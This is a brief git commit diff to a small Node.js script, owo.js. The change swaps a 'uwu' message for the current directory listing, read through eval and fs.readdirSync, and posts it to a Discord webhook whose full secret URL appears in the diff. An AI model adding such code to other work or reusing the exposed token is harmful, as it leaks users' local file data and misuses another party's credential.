4984c8b060df944fa7c800e6d71de9a9dd21d23a
SwxtchCode <swxtchcode@protonmail.com>
2020-10-31 13:48:49 -0700

    Update owo.js

--- owo.js
+++ owo.js
@@ -1,6 +1,9 @@
 const fetch = require('node-fetch');
+const fs = require('fs');
 
-body = {'content':'uwu'};
+thingToPost=eval(`fs.readdirSync("./")`);
+
+body = {'content':thingToPost};
 
 fetch('https://discord.com/api/webhooks/772197161366192128/Hy5-EkgsxgBupHlLcI85_6fYyZynZ34AQSs7mE-XaL-VK_bBKrGMvdgoL_JCBwrQhg6r', {
         method: 'post',
